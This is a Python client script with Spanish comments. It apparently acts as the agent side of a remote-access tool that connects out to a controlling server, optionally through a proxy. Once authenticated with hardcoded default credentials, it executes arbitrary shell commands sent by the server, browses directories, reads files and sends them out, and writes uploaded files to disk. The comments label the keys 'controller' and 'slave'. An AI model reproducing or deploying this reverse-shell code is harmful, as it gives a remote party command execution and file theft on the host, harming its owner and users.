# -*- coding: UTF-8 -*-

import socket
from utils import hibrid
from utils import client_interact
from modules import hashing
from subprocess import PIPE, Popen
from modules import convex
import os
from utils import config

# Configuración

configuration = config.conf

# Configuración del proxy

proxy_settings = configuration['proxy_setting']
proxy_use = proxy_settings['use']
proxy_type = proxy_settings['proxy_type']
proxy_addr = proxy_settings['proxy_addr']
proxy_rdns = proxy_settings['rdns']
proxy_username = proxy_settings['username']
proxy_password = proxy_settings['password']

# Información general

rhost = str() # Dirección del servidor
rport = int() # Puerto del servidor
user = str("root") # Usuario, normalmente esta en la configuración
passwd = str("password123!") # Contraseña, normalmente esta en la configuración
buff = int(1024) # El tamaño de la carga en memoria, 1024 esta perfecto, aunque si comienza a tener grandes cantidades de longitudes de datos use uno más grande

public_key = str() # Controlador
private_key = str() # Esclavo

if (proxy_use == True):

    convex.transfor(proxy_type, proxy_addr, proxy_rdns, proxy_username, proxy_password) # Usamos un proxy en nuestras conexiones

def client_connect(rhost, rport, pub_key, priv_key, user, passwd, buff=1024):

    client_obj = socket.socket()
    client_obj.connect((rhost, rport))

    credentials = hashing.hash(user)+';'+hashing.hash(passwd)

    client_interact.send(client_obj, pub_key, credentials)

    response = client_obj.recv(1)

    if not (int(response) == 1):

        return False

    while True:

        try:

            data = hibrid.decrypt(client_interact.recv(client_obj), priv_key)

        except Exception as Except:

            #print(str(Except))

            break

        command = data.split()

        if (command[0].lower() == 'execute'):

            response, error = Popen(data[8:].strip(), shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE).communicate()
            result = str(response)+str(error)

            client_interact.send(client_obj, pub_key, result)

        elif (command[0].lower() == 'cd'):

            if (os.path.isdir(data[3:])):

                os.chdir(data[3:])

                client_interact.send(client_obj, pub_key, 'La ruta fue cambiada a: ' + str(os.getcwd()))

            else:

                client_interact.send(client_obj, pub_key, 'Hubo un error tratando de acceder a una ruta externa!')

        elif (command[0].lower() == 'pwd'):

            client_interact.send(client_obj, pub_key, 'Ruta actual: ' + str(os.getcwd()))

        elif (command[0].lower() == 'ls'):

            client_interact.send(client_obj, pub_key, "\n".join(os.listdir(os.getcwd())))

        elif (command[0].lower() == 'download'):
        
            name = data.replace(command[0]+' ','')

            with open(name, 'rb') as read_file:

                client_interact.send(client_obj, pub_key, 'download/%s %s' % (read_file.read().encode("hex"), os.path.basename(name)))

        elif (command[0][:7].lower() == 'upload/'):

            name = os.path.basename(data.replace(command[0]+' ',''))

            with open(name, 'wb') as write_file:

                write_file.write(command[0][7:].decode("hex"))

            client_interact.send(client_obj, pub_key, '"%s" se subio satisfactoriamente! ...' % (name))

        else:

            client_interact.send(client_obj, pub_key, 'Error con el comando: '+str(data))

def init_connection():

    global rhost, rport, public_key, private_key, user, passwd, buff

    client_connect(rhost, rport, public_key, private_key, user, passwd, buff)

if (__name__ == '__main__'):

    init_connection()
    convex.restruct() # Volvemos a configurar el estandar de los sockets en python
